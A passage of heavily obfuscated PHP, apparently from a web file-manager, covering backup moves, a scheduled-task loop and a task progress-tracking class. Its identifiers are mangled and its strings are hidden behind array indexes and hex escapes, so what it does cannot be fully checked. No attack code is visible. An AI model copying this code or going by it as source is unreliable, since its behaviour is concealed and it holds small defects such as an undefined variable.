·æÌ«[$Ú““Ã¥[97]]) ? $ ·æÌ«[$Ú““Ã¥[97]] : array(); $¥¯¯¶ŠÚ = array_sum(array_column($õ‡Â‰´Ô, $Ú““Ã¥[90])); if (!$¥¯¯¶ŠÚ) { Backup::log($Ú““Ã¥[907] . $¢ß§èÚä); return !1; } $ø·üõ€Ê = array($Ú““Ã¥[908] => $¥¯¯¶ŠÚ, $Ú““Ã¥[909] => time()); Backup::set($ø·üõ€Ê); Hook::trigger($Ú““Ã¥[910], $¢ß§èÚä, $âöŸé´²); $¤¨Ú‰ûÃ = new TaskFileTransfer($Ú““Ã¥[910], $Ú““Ã¥[881], count($õ‡Â‰´Ô), LNG($Ú““Ã¥[890]) . $Ú““Ã¥[483] . LNG($Ú““Ã¥[892]) . $Ú““Ã¥[911]); $¤¨Ú‰ûÃ->task[$Ú““Ã¥[865]] = $¥¯¯¶ŠÚ; foreach ($ ·æÌ«[$Ú““Ã¥[97]] as $•Ğ·ØãŠ) { $—îğËæ = IO::move($•Ğ·ØãŠ[$Ú““Ã¥[98]], $âöŸé´²); if (!$—îğËæ) { $¤¨Ú‰ûÃ->end(); $ş†Ó»ìÙ = IO::getLastError($Ú““Ã¥[912] . $•Ğ·ØãŠ[$Ú““Ã¥[98]] . $Ú““Ã¥[913] . $âöŸé´² . $Ú““Ã¥[188]); Backup::log($ş†Ó»ìÙ); return !1; } } $¤¨Ú‰ûÃ->end(); $ø·üõ€Ê = array($Ú““Ã¥[914] => $¥¯¯¶ŠÚ, $Ú““Ã¥[915] => time()); Backup::set($ø·üõ€Ê); return !0; } private function backupPath($Õ¤Òñ´³) { $ø•İ›¬¶ =& $_SERVER[¤øïŠ‹²]; $Ø¾±¿Ôº = $Õ¤Òñ´³[$ø•İ›¬¶[32]]; $‹ıŞĞ™õ = Model($ø•İ›¬¶[874])->get($ø•İ›¬¶[875]); $Åüì©“Ø = substr(md5($ø•İ›¬¶[876] . $‹ıŞĞ™õ . $Ø¾±¿Ôº), 0, 8); return "\173\x69\x6f\x3a{$Õ¤Òñ´³[$ø•İ›¬¶[853]]}\175\57\144\x61\x74\x61\x62\141\163\x65\x2f\142\x61\x63\153\165\x70\57" . $Ø¾±¿Ôº . $ø•İ›¬¶[11] . $Åüì©“Ø; } private function tmpFilesPath() { $ÑÚ‹¨ç¼ =& $_SERVER[¤øïŠ‹²]; $ƒ²€Íú¤ = TEMP_FILES; if ($GLOBALS[$ÑÚ‹¨ç¼[6]][$ÑÚ‹¨ç¼[103]][$ÑÚ‹¨ç¼[902]]) { $ƒ²€Íú¤ = $GLOBALS[$ÑÚ‹¨ç¼[6]][$ÑÚ‹¨ç¼[103]][$ÑÚ‹¨ç¼[902]]; if (!mk_dir($ƒ²€Íú¤) || !is_writable($ƒ²€Íú¤) || !IO::mkfile($ƒ²€Íú¤ . $ÑÚ‹¨ç¼[903])) { $ƒ²€Íú¤ = TEMP_FILES; } } return $ƒ²€Íú¤; } } goto D¦ÉÂÜ‰; cº¬ÜƒĞ«: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $á°¢¾Üı =& $_SERVER[¤øïŠ‹²]; if (self::valueGet($á°¢¾Üı[851]) != $á°¢¾Üı[102]) { return; } if (self::valueGet($á°¢¾Üı[1875]) == $á°¢¾Üı[102]) { $ì×±ìúï = self::valueGet($á°¢¾Üı[1876]); if (time() - $ì×±ìúï > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($á°¢¾Üı[1875], $á°¢¾Üı[102]); self::log($á°¢¾Üı[1877] . ACTION . $á°¢¾Üı[1878]); Hook::bind($á°¢¾Üı[1879], $á°¢¾Üı[1880]); $ğÚ—á  = 0; while (!0) { self::cacheClear(); if (self::valueGet($á°¢¾Üı[851]) != $á°¢¾Üı[102]) { self::valueSet($á°¢¾Üı[1875], $á°¢¾Üı[241]); self::log($á°¢¾Üı[1881]); die; } $ù¿ î–¹ = time(); if ($ù¿ î–¹ - $ğÚ—á  >= 60) { self::valueSet(array($á°¢¾Üı[1875] => $á°¢¾Üı[102], $á°¢¾Üı[1876] => $ù¿ î–¹)); $ğÚ—á  = $ù¿ î–¹; } if (!file_exists(USER_SYSTEM . $á°¢¾Üı[1882])) { self::valueSet(array($á°¢¾Üı[1875] => $á°¢¾Üı[241], $á°¢¾Üı[851] => $á°¢¾Üı[241])); self::log($á°¢¾Üı[1883]); die; } $ÏšĞÎåû = file_get_contents(BASIC_PATH . $á°¢¾Üı[1884]); $éîÏş˜‡ = KOD_VERSION . $á°¢¾Üı[10] . KOD_VERSION_BUILD; $Ñ–†áÊ² = match_text($ÏšĞÎåû, $á°¢¾Üı[1885]) . $á°¢¾Üı[10] . match_text($ÏšĞÎåû, $á°¢¾Üı[1886]); if ($Ñ–†áÊ² != $éîÏş˜‡) { self::restart(); self::log("\x73\x74\157\x70\145\144\x2e\x5b\x76\x65\x72\x73\151\157\x6e\x20\165\160\144\141\164\145\x3b{$versionNow}\40\x3d\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $üÆÛ¬Š =& $_SERVER[¤øïŠ‹²]; http_close(); $GLOBALS[$üÆÛ¬Š[1887]] = 1; $_SERVER[$üÆÛ¬Š[1888]] = $üÆÛ¬Š[1889]; $_COOKIE = array(); $GLOBALS[$üÆÛ¬Š[1890]] = 1; $GLOBALS[$üÆÛ¬Š[1891]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ı¯ä­©€ =& $_SERVER[¤øïŠ‹²]; http_close(); self::valueSet($ı¯ä­©€[851], $ı¯ä­©€[241]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ı¯ä­©€[1875] => $ı¯ä­©€[241], $ı¯ä­©€[851] => $ı¯ä­©€[102])); self::log($ı¯ä­©€[1892]); } public static function taskSwitch() { $Û§ËÚ¡Í =& $_SERVER[¤øïŠ‹²]; $îü²—Ê² = self::valueGet($Û§ËÚ¡Í[851]) == $Û§ËÚ¡Í[102] ? $Û§ËÚ¡Í[241] : $Û§ËÚ¡Í[102]; self::valueSet($Û§ËÚ¡Í[851], $îü²—Ê²); } public static function shutdownEvent() { $ÄÍ¥ÅÉ =& $_SERVER[¤øïŠ‹²]; self::valueSet($ÄÍ¥ÅÉ[1875], $ÄÍ¥ÅÉ[241]); self::log($ÄÍ¥ÅÉ[1893]); } public static function config($¶Ë¡Œ‹’, $íÑäå®É) { self::valueSet($_SERVER[¤øïŠ‹²][851], $¶Ë¡Œ‹’); } private static function taskRunAll() { $Ğ¢•ØáÙ =& $_SERVER[¤øïŠ‹²]; $àóƒ£¤· = timeFloat(); $ìÂĞ£¬Ë = Model($Ğ¢•ØáÙ[1894])->listData(); $ƒĞÅ£Ãã = count($ìÂĞ£¬Ë); for ($‹¨ª¾´ = 0; $‹¨ª¾´ < $ƒĞÅ£Ãã; $‹¨ª¾´++) { $ßãÅ˜êÀ = $ìÂĞ£¬Ë[$‹¨ª¾´]; if (!$ßãÅ˜êÀ[$Ğ¢•ØáÙ[493]] || $ßãÅ˜êÀ[$Ğ¢•ØáÙ[1895]] != $Ğ¢•ØáÙ[102]) { continue; } if (!self::taskTimeCheck($ßãÅ˜êÀ)) { continue; } self::taskRun($ßãÅ˜êÀ); } Hook::trigger($Ğ¢•ØáÙ[1896]); self::taskQueueRun($àóƒ£¤·); } private static function taskQueueRun($ì´ËÒ ) { $ÌÀÛúŒĞ = 10; while (!0) { $—úìš–À = TaskQueue::run(); if ($—úìš–À === !1) { break; } if (timeFloat() - $ì´ËÒ  >= $ÌÀÛúŒĞ) { break; } } } private static function taskTimeCheck($¾Ô¢…‰¡) { $Êê¡ÛàÒ =& $_SERVER[¤øïŠ‹²]; $İğœÕ¸ = json_decode($¾Ô¢…‰¡[$Êê¡ÛàÒ[217]], !0); $Û¡ĞõÙ = intval($¾Ô¢…‰¡[$Êê¡ÛàÒ[1876]]); $àïÍÕœÒ = strtotime($Êê¡ÛàÒ[1897] . $İğœÕ¸[$Êê¡ÛàÒ[1898]] . $Êê¡ÛàÒ[1899]) - strtotime($Êê¡ÛàÒ[1900]); $ËÇú×¶¹ = time() - strtotime(date($Êê¡ÛàÒ[1901]) . $Êê¡ÛàÒ[1902]); $‹¹’ªô = $ËÇú×¶¹ >= $àïÍÕœÒ && $ËÇú×¶¹ <= $àïÍÕœÒ + 3600; switch ($İğœÕ¸[$Êê¡ÛàÒ[33]]) { case $Êê¡ÛàÒ[1903]: if (time() - $Û¡ĞõÙ < 3600 * 24 * 30) { return !1; } if ($İğœÕ¸[$Êê¡ÛàÒ[1903]] == date($Êê¡ÛàÒ[1904]) && $‹¹’ªô) { return !0; } break; case $Êê¡ÛàÒ[1905]: if (time() - $Û¡ĞõÙ < 3600 * 24 * 7) { return !1; } $·ëÂÜ¢ = date($Êê¡ÛàÒ[1906]) == 0 ? 7 : date($Êê¡ÛàÒ[1906]); if ($İğœÕ¸[$Êê¡ÛàÒ[1905]] == $·ëÂÜ¢ && $‹¹’ªô) { return !0; } break; case $Êê¡ÛàÒ[1898]: if (time() - $Û¡ĞõÙ < 3600 * 24) { return !1; } if ($‹¹’ªô) { return !0; } break; case $Êê¡ÛàÒ[1907]: if (time() - $Û¡ĞõÙ >= floatval($İğœÕ¸[$Êê¡ÛàÒ[1907]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ËµØÈä© =& $_SERVER[¤øïŠ‹²]; static $âø¼Õƒã = 0; $„ÍúØÆµ = 300; if (!$âø¼Õƒã) { $âø¼Õƒã = time(); } if (time() - $âø¼Õƒã < $„ÍúØÆµ) { return; } $âø¼Õƒã = time(); $ŞûÔš‡ = Model($ËµØÈä©[603])->db($ËµØÈä©[12]); if ($ŞûÔš‡) { $ŞûÔš‡->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ËµØÈä©[1908], $ËµØÈä©[1909]); die; } } public static function taskRun($Ø’’Å¾) { $±ãÉãü» =& $_SERVER[¤øïŠ‹²]; self::log($±ãÉãü»[1910] . $Ø’’Å¾[$±ãÉãü»[493]] . $±ãÉãü»[1911] . $Ø’’Å¾[$±ãÉãü»[32]] . $±ãÉãü»[1912] . $Ø’’Å¾[$±ãÉãü»[1513]]); Model($±ãÉãü»[1894])->run($Ø’’Å¾[$±ãÉãü»[493]]); $üîÒ÷¼ = timeFloat(); $áöİÜû‡ = $±ãÉãü»[12]; switch ($Ø’’Å¾[$±ãÉãü»[33]]) { case $±ãÉãü»[394]: $ÜºùûâÍ = url_request($Ø’’Å¾[$±ãÉãü»[1513]], $±ãÉãü»[1555], !1, !1, !1, !1, 10); if ($ÜºùûâÍ[$±ãÉãü»[851]]) { $áöİÜû‡ = strlen($ÜºùûâÍ[$±ãÉãü»[1339]]); } break; case $±ãÉãü»[1913]: $áöİÜû‡ = Hook::apply($Ø’’Å¾[$±ãÉãü»[1513]]); default: break; } Model($±ãÉãü»[1914])->add(array($±ãÉãü»[1915] => $±ãÉãü»[12], $±ãÉãü»[1916] => $±ãÉãü»[241], $±ãÉãü»[33] => $±ãÉãü»[1917] . $Ø’’Å¾[$±ãÉãü»[493]], $±ãÉãü»[1918] => json_encode(array($±ãÉãü»[32] => $Ø’’Å¾[$±ãÉãü»[32]], $±ãÉãü»[1919] => timeFloat() - $üîÒ÷¼, $±ãÉãü»[857] => $áöİÜû‡)))); $Õ•Å–¦Ò = $áöİÜû‡ ? $±ãÉãü»[1920] . $áöİÜû‡ : $±ãÉãü»[12]; self::log($±ãÉãü»[1921] . $Ø’’Å¾[$±ãÉãü»[493]] . $±ãÉãü»[188] . $Õ•Å–¦Ò); return !0; } public static function valueGet($™œ’­˜±) { $›ğöü° =& $_SERVER[¤øïŠ‹²]; $ÎÉ·¢° = $›ğöü°[1922]; $Åùş¼¬Ù = Model($›ğöü°[528])->get($™œ’­˜±, $ÎÉ·¢°); if (is_null($Åùş¼¬Ù)) { Model($›ğöü°[528])->set($›ğöü°[851], $›ğöü°[102], $ÎÉ·¢°); Model($›ğöü°[528])->set($›ğöü°[1875], $›ğöü°[241], $ÎÉ·¢°); $Åùş¼¬Ù = Model($›ğöü°[528])->get($™œ’­˜±, $ÎÉ·¢°); } return $Åùş¼¬Ù; } private static function valueSet($å€ÖÄÌã, $Ã¿ÃÜÜ = false) { $·‚›ò¯ =& $_SERVER[¤øïŠ‹²]; $¼Ì·¢‡¡ = $·‚›ò¯[1923]; CacheLock::lock($¼Ì·¢‡¡); $›©—î¸ó = Model($·‚›ò¯[528])->set($å€ÖÄÌã, $Ã¿ÃÜÜ, $·‚›ò¯[1922]); CacheLock::unlock($¼Ì·¢‡¡); return $›©—î¸ó; } protected static function log($š­²¿®‹) { write_log($š­²¿®‹, $_SERVER[¤øïŠ‹²][1909]); } private static function cacheClear() { $Ò”ş•ãÇ =& $_SERVER[¤øïŠ‹²]; Cache::clearMemory(Model($Ò”ş•ãÇ[528])->cacheKey($Ò”ş•ãÇ[1922])); Cache::clearMemory(Model($Ò”ş•ãÇ[528])->cacheKey($Ò”ş•ãÇ[1924])); Model($Ò”ş•ãÇ[1894])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\x70"; const STATYS_RUNNING = "\x72\165\156\x6e\x69\156\x67"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Æ°õ€±, $¡ú‘¹èÍ = '', $ÈùÈÑåš = 0, $ºªÛİŠè = '') { $”Îô  =& $_SERVER[¤øïŠ‹²]; if (self::get($Æ°õ€±)) { return; } $this->task = array($”Îô [493] => $Æ°õ€±, $”Îô [1542] => USER_ID, $”Îô [1813] => $ºªÛİŠè, $”Îô [546] => $”Îô [12], $”Îô [33] => $¡ú‘¹èÍ, $”Îô [1180] => $”Îô [12], $”Îô [1178] => $ÈùÈÑåš, $”Îô [1925] => 0, $”Îô [1926] => 0, $”Îô [1927] => 0, $”Îô [1928] => timeFloat(), $”Îô [1929] => 0, $”Îô [1930] => 0, $”Îô [1931] => 0, $”Îô [1932] => 0, $”Îô [851] => $”Îô [1875]); $GLOBALS[$”Îô [1933]] = 1; Hook::bind($”Îô [1879], array($this, $”Îô [1934])); Hook::bind($”Îô [1935], array($this, $”Îô [1936])); $this->startAfter(); Hook::trigger($”Îô [1937], $this->task); $this->task[$”Îô [1930]] = timeFloat(); } public function end($õı®†êù = '') { $õß£šÒ =& $_SERVER[¤øïŠ‹²]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$õß£šÒ[1930]]) { self::valueSet($this->task[$õß£šÒ[493]], !1); } $this->isEnd = !0; if ($õı®†êù) { $this->task[$õß£šÒ[546]] = $õı®†êù; } self::log($õß£šÒ[1938] . $this->task[$õß£šÒ[493]] . $õß£šÒ[1939] . sprintf($õß£šÒ[964], timeFloat() - $this->task[$õß£šÒ[1928]]) . $õß£šÒ[1940]); Hook::unbind($õß£šÒ[1879], array($this, $õß£šÒ[1934])); Hook::unbind($õß£šÒ[1935], array($this, $õß£šÒ[1936])); $this->endAfter(); $Çı¹¥‚¾ = $this->task; $this->task = !1; Hook::trigger($õß£šÒ[1941], $Çı¹¥‚¾); } public function update($÷şĞÄÈ = 0, $şû·©ò£ = false) { $şŞØ µµ =& $_SERVER[¤øïŠ‹²]; $Ş ãƒÄ’ =& $this->task; if (!$Ş ãƒÄ’) { return; } $Ş ãƒÄ’[$şŞØ µµ[1925]] += $÷şĞÄÈ; $Ş ãƒÄ’[$şŞØ µµ[1929]] = timeFloat(); if ($Ş ãƒÄ’[$şŞØ µµ[1178]]) { if ($Ş ãƒÄ’[$şŞØ µµ[1178]] < $Ş ãƒÄ’[$şŞØ µµ[1925]]) { $Ş ãƒÄ’[$şŞØ µµ[1178]] = $Ş ãƒÄ’[$şŞØ µµ[1925]]; } $íùî›Õ = timeFloat() - $Ş ãƒÄ’[$şŞØ µµ[1928]] - $Ş ãƒÄ’[$şŞØ µµ[1931]]; if ($íùî›Õ <= 0) { $íùî›Õ = 0.001; } $Ş ãƒÄ’[$şŞØ µµ[1926]] = $Ş ãƒÄ’[$şŞØ µµ[1925]] / $Ş ãƒÄ’[$şŞØ µµ[1178]]; $Ş ãƒÄ’[$şŞØ µµ[1927]] = $Ş ãƒÄ’[$şŞØ µµ[1925]] / $íùî›Õ; if ($Ş ãƒÄ’[$şŞØ µµ[1926]] > 0) { $Ş ãƒÄ’[$şŞØ µµ[1932]] = $íùî›Õ * (1 - $Ş ãƒÄ’[$şŞØ µµ[1926]]) / $Ş ãƒÄ’[$şŞØ µµ[1926]]; } $Ş ãƒÄ’[$şŞØ µµ[1932]] = $Ş ãƒÄ’[$şŞØ µµ[1932]] <= 0 ? 0 : $Ş ãƒÄ’[$şŞØ µµ[1932]]; } $this->updateAfter(); $Áó§ö³¤ = 0.2; if (timeFloat() - $Ş ãƒÄ’[$şŞØ µµ[1930]] < $Áó§ö³¤ && !$şû·©ò£) { return; } $¢Şı´ç£ = self::get($Ş ãƒÄ’[$şŞØ µµ[493]]); $öÕ‘‰ş® = $¢Şı´ç£[$şŞØ µµ[851]]; if ($öÕ‘‰ş® == self::STATYS_KILL) { $¯Ÿ±Øô = array($şŞØ µµ[1942] => LNG($şŞØ µµ[1943]), $şŞØ µµ[1349] => !1); Cache::set($şŞØ µµ[1944] . $this->task[$şŞØ µµ[493]], $¯Ÿ±Øô, 30); $this->onKill(); $this->end(); die; } else { if ($öÕ‘‰ş® == self::STATYS_STOP) { $ô³¢„Òı = 2; $¢Şı´ç£[$şŞØ µµ[1931]] += $ô³¢„Òı; self::valueSet($Ş ãƒÄ’[$şŞØ µµ[493]], $¢Şı´ç£); sleep($ô³¢„Òı); $this->update(); return; } } $Ş ãƒÄ’[$şŞØ µµ[851]] = $öÕ‘‰ş® ? $öÕ‘‰ş® : $Ş ãƒÄ’[$şŞØ µµ[851]]; $Ş ãƒÄ’[$şŞØ µµ[1931]] = $¢Şı´ç£[$şŞØ µµ[1931]] ? $¢Şı´ç£[$şŞØ µµ[1931]] : 0; $Ş ãƒÄ’[$şŞØ µµ[1930]] = timeFloat(); Hook::trigger($şŞØ µµ[1945], $Ş ãƒÄ’); self::valueSet($Ş ãƒÄ’[$şŞØ µµ[493]], $Ş ãƒÄ’); } public function onKillSet($åşø‚ºÃ, $ª³º˜ÅÌ = array()) { $this->onKillCall = array($åşø‚ºÃ, $ª³º˜ÅÌ); } public function onKill() { $øº‡™”˜ =& $_SERVER[¤øïŠ‹²]; self::log($øº‡™”˜[1938] . $this->task[$øº‡™”˜[493]] . $øº‡™”˜[1946]); Hook::trigger($øº‡™”˜[1947], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÜÕàÂÈ) { $™ĞšÖÔÙ =& $_SERVER[¤øïŠ‹²]; Cache::set($™ĞšÖÔÙ[1944] . $this->task[$™ĞšÖÔÙ[493]], $ÜÕàÂÈ, 60); if (!is_array($ÜÕàÂÈ) || !$ÜÕàÂÈ[$™ĞšÖÔÙ[1349]]) { self::log($™ĞšÖÔÙ[1948] . json_encode($ÜÕàÂÈ)); } return $ÜÕàÂÈ; } public static function get($ö¤¹Çí€) { $É˜Ü‚—– =& $_SERVER[¤øïŠ‹²]; $¶¹Òß£ô = self::valueGet($ö¤¹Çí€); if (is_array($¶¹Òß£ô) && $¶¹Òß£ô[$É˜Ü‚—–[1949]]) { $Ší€ä€¶ = ActionApply($¶¹Òß£ô[$É˜Ü‚—–[1949]], array($¶¹Òß£ô)); $¶¹Òß£ô = is_array($Ší€ä€¶) ? $Ší€ä€¶ : $¶¹Òß£ô; } return $¶¹Òß£ô; } public static function listData() { $à¬ûØ´â = self::valueGet(); return array_sort_by($à¬ûØ´â, $_SERVER[¤øïŠ‹²][1928], !0); } public static function kill($ÓĞÑ‚£û) { return self::changeStatus($ÓĞÑ‚£û, self::STATYS_KILL); } public static function stop($©²®Ñ¢) { return self::changeStatus($©²®Ñ¢, self::STATYS_STOP); } public static function restart($á—Ÿı×) { return self::changeStatus($á—Ÿı×, self::STATYS_RUNNING); } public static function killAll() { $¹ù¿·Î¹ =& $_SERVER[¤øïŠ‹²]; $•ÇáÃë• = self::listData(); foreach ($•ÇáÃë• as $·¥³ğ„¿) { self::kill($·¥³ğ„¿[$¹ù¿·Î¹[493]]); } sleep(2); foreach ($•ÇáÃë• as $·¥³ğ„¿) { self::valueSet($·¥³ğ„¿[$¹ù¿·Î¹[493]], !1); } } private static function changeStatus($›Ïş‰à², $ã¿ÖŒ’) { $µÉñ°ÈÁ =& $_SERVER[¤øïŠ‹²]; $»ª¾Ëû = self::valueGet($›Ïş‰à²); if (!$»ª¾Ëû) { return !1; } $»ª¾Ëû[$µÉñ°ÈÁ[851]] = $ã¿ÖŒ’; self::valueSet($›Ïş‰à², $»ª¾Ëû); self::log($µÉñ°ÈÁ[1950] . $»ª¾Ëû[$µÉñ°ÈÁ[493]] . $µÉñ°ÈÁ[1951] . $ã¿ÖŒ’); return !0; } public static function valueGet($¬Ê Œ“ß = false) { $¾š­¤Ì =& $_SERVER[¤øïŠ‹²]; if ($¬Ê Œ“ß) { $öŸèïîî = Model($¾š­¤Ì[540])->where(array($¾š­¤Ì[106] => $¬Ê Œ“ß, $¾š­¤Ì[33] => $¾š­¤Ì[1187]))->find(); return $öŸèïîî ? json_decode($öŸèïîî[$¾š­¤Ì[462]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ı­Üî‘ = false) { $Ì—œâ² =& $_SERVER[¤øïŠ‹²]; $çØ¤ÉÛ = array($Ì—œâ²[33] => $Ì—œâ²[1187]); if ($ı­Üî‘) { $çØ¤ÉÛ[$Ì—œâ²[1542]] = $ı­Üî‘; } $õÓØØé = Model($Ì—œâ²[540])->where($çØ¤ÉÛ)->select(); $õÓØØé = $õÓØØé ? $õÓØØé : array(); foreach ($õÓØØé as $ıûÆ»ÃØ => $‹§åƒíå) { $õÓØØé[$ıûÆ»ÃØ] = json_decode($‹§åƒíå[$Ì—œâ²[462]], !0); } return $õÓØØé; } public static function valueSet($ç•½¡ûª, $ĞÓ…«û’) { $“Œœ©´„ =& $_SERVER[¤øïŠ‹²]; if (!$ĞÓ…«û’) { return Model($“Œœ©´„[540])->where(array($“Œœ©´„[106] => $ç•½¡ûª, $“Œœ©´„[33] => $“Œœ©´„[1187]))->delete(); } $ŒãÊŒŸ = json_encode($ĞÓ…«û’); if (!$ŒãÊŒŸ) { ob_start(); var_dump($ĞÓ…«û’); $Ô€Ò©æ‚ = ob_get_clean(); self::log($“Œœ©´„[1952] . json_encode_force($Ô€Ò©æ‚)); } if (!$ç•½¡ûª || !$ĞÓ…«û’[$“Œœ©´„[493]]) { return !1; } $Õ”ğåÄõ = array($“Œœ©´„[33] => $“Œœ©´„[1187], $“Œœ©´„[1542] => USER_ID, $“Œœ©´„[106] => $ç•½¡ûª, $“Œœ©´„[462] => $ŒãÊŒŸ); $äù¨˜òÑ = $“Œœ©´„[1953]; CacheLock::lock($äù¨˜òÑ); Model($“Œœ©´„[540])->add($Õ”ğåÄõ, array(), !0); CacheLock::unlock($äù¨˜òÑ); } public static function log($ËÒ±ÅÆş) { if (!GLOBAL_DEBUG) { return; } write_log($ËÒ±ÅÆş, $_SERVER[¤øïŠ‹²][1954]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ÙÙ¼šè° =& $_SERVER[¤øïŠ‹²]; $îÕÙáâÉ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ÙÙ¼šè°[1955], array($this, $ÙÙ¼šè°[1956])); Hook::bind($ÙÙ¼šè°[1360], array($this, $ÙÙ¼šè°[1957])); Hook::bind($ÙÙ¼šè°[1958], array($this, $ÙÙ¼šè°[1959])); Hook::bind($ÙÙ¼šè°[697], array($this, $ÙÙ¼šè°[1960])); Hook::bind($ÙÙ¼šè°[698], array($this, $ÙÙ¼šè°[1961])); Hook::bind($ÙÙ¼šè°[704], array($this, $ÙÙ¼šè°[1962])); Hook::bind($ÙÙ¼šè°[705], array($this, $ÙÙ¼šè°[1963])); Hook::bind($ÙÙ¼šè°[700], array($this, $ÙÙ¼šè°[1964])); Hook::bind($ÙÙ¼šè°[702], array($this, $ÙÙ¼šè°[1965])); Hook::bind($ÙÙ¼šè°[666], array($this, $ÙÙ¼šè°[1966])); Hook::bind($ÙÙ¼šè°[663], array($this, $ÙÙ¼šè°[1966])); Hook::bind($ÙÙ¼šè°[668], array($this, $ÙÙ¼šè°[1966])); Hook::bind($ÙÙ¼šè°[670], array($this, $ÙÙ¼šè°[1966])); Hook::bind($ÙÙ¼šè°[672], array($this, $ÙÙ¼šè°[1966])); Hook::bind($ÙÙ¼šè°[1967], array($this, $ÙÙ¼šè°[1968])); Hook::bind($ÙÙ¼šè°[688], array($this, $ÙÙ¼šè°[1969])); $this->sourceModelCopyFlag = !1; Hook::bind($ÙÙ¼šè°[1970], array($this, $ÙÙ¼šè°[1971])); Hook::bind($ÙÙ¼šè°[1972], array($this, $ÙÙ¼šè°[1973])); Hook::bind($ÙÙ¼šè°[1974], array($this, $ÙÙ¼šè°[1975])); $îÕÙáâÉ[$ÙÙ¼šè°[1976]] = LNG($ÙÙ¼šè°[1977]); $îÕÙáâÉ[$ÙÙ¼šè°[1978]] = 0; $îÕÙáâÉ[$ÙÙ¼šè°[1979]] = 0; $îÕÙáâÉ[$ÙÙ¼šè°[1180]] = $ÙÙ¼šè°[12]; $îÕÙáâÉ[$ÙÙ¼šè°[1980]] = $ÙÙ¼šè°[12]; $îÕÙáâÉ[$ÙÙ¼šè°[1981]] = 0; $îÕÙáâÉ[$ÙÙ¼šè°[1982]] = 0; $îÕÙáâÉ[$ÙÙ¼šè°[1983]] = 0; if (!$îÕÙáâÉ[$ÙÙ¼šè°[1813]]) { $îÕÙáâÉ[$ÙÙ¼šè°[1813]] = LNG($ÙÙ¼šè°[1984]); } } protected function endAfter() { $¹…«®Ÿ =& $_SERVER[¤øïŠ‹²]; Hook::unbind($¹…«®Ÿ[1955], array($this, $¹…«®Ÿ[1956])); Hook::unbind($¹…«®Ÿ[1360], array($this, $¹…«®Ÿ[1957])); Hook::unbind($¹…«®Ÿ[1958], array($this, $¹…«®Ÿ[1959])); Hook::unbind($¹…«®Ÿ[697], array($this, $¹…«®Ÿ[1960])); Hook::unbind($¹…«®Ÿ[698], array($this, $¹…«®Ÿ[1961])); Hook::unbind($¹…«®Ÿ[704], array($this, $¹…«®Ÿ[1962])); Hook::unbind($¹…«®Ÿ[705], array($this, $¹…«®Ÿ[1963])); Hook::unbind($¹…«®Ÿ[700], array($this, $¹…«®Ÿ[1964])); Hook::unbind($¹…«®Ÿ[702], array($this, $¹…«®Ÿ[1965])); Hook::unbind($¹…«®Ÿ[666], array($this, $¹…«®Ÿ[1966])); Hook::unbind($¹…«®Ÿ[663], array($this, $¹…«®Ÿ[1966])); Hook::unbind($¹…«®Ÿ[668], array($this, $¹…«®Ÿ[1966])); Hook::unbind($¹…«®Ÿ[670], array($this, $¹…«®Ÿ[1966])); Hook::unbind($¹…«®Ÿ[672], array($this, $¹…«®Ÿ[1966])); Hook::unbind($¹…«®Ÿ[1967], array($this, $¹…«®Ÿ[1968])); Hook::unbind($¹…«®Ÿ[688], array($this, $¹…«®Ÿ[1969])); Hook::unbind($¹…«®Ÿ[1970], array($this, $¹…«®Ÿ[1971])); Hook::unbind($¹…«®Ÿ[1972], array($this, $¹…«®Ÿ[1973])); Hook::unbind($¹…«®Ÿ[1974], array($this, $¹…«®Ÿ[1975])); } public function copyMoveStart($œ®•”Åì, $¿ÕÚ™ä, $†”˜ÖÁå, $ã…¯‘–) { $äÖÜ¥äø =& $_SERVER[¤øïŠ‹²]; self::log($äÖÜ¥äø[1985] . $¿ÕÚ™ä . $äÖÜ¥äø[84] . $ã…¯‘–); $é³•‹¥® = rtrim(TEMP_FILES, $äÖÜ¥äø[8]); if (substr($¿ÕÚ™ä, 0, strlen($é³•‹¥®)) == $é³•‹¥®) { return; } if (substr($ã…¯‘–, 0, strlen($é³•‹¥®)) == $é³•‹¥®) { return; } $†Üè·®‡ =& $this->task; $†Üè·®‡[$äÖÜ¥äø[1986]] = KodIO::transferType($œ®•”Åì, $†”˜ÖÁå); self::log($äÖÜ¥äø[1987] . $†Üè·®‡[$äÖÜ¥äø[1986]] . $äÖÜ¥äø[85] . $¿ÕÚ™ä . $äÖÜ¥äø[84] . $ã…¯‘–); $this->update(); } public function updateAfter() { $Ÿ„õéÓ¬ =& $_SERVER[¤øïŠ‹²]; $Ï¸†‹€ =& $this->task; if (!$Ï¸†‹€[$Ÿ„õéÓ¬[865]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Ï¸†‹€[$Ÿ„õéÓ¬[1986]] == $Ÿ„õéÓ¬[1463]) { return; } self::updateTask($Ï¸†‹€); } private static function updateTask(&$ƒÍšŠóí) { $ñ—„öõ¶ =& $_SERVER[¤øïŠ‹²]; if ($ƒÍšŠóí[$ñ—„öõ¶[1986]] == $ñ—„öõ¶[1331] || $ƒÍšŠóí[$ñ—„öõ¶[1986]] == $ñ—„öõ¶[119]) { if ($ƒÍšŠóí[$ñ—„öõ¶[1980]]) { $ƒÍšŠóí[$ñ—„öõ¶[1983]] = $ƒÍšŠóí[$ñ—„öõ¶[1982]] + $ƒÍšŠóí[$ñ—„öõ¶[1979]]; } } else { if ($ƒÍšŠóí[$ñ—„öõ¶[1986]] == $ñ—„öõ¶[1464]) { if 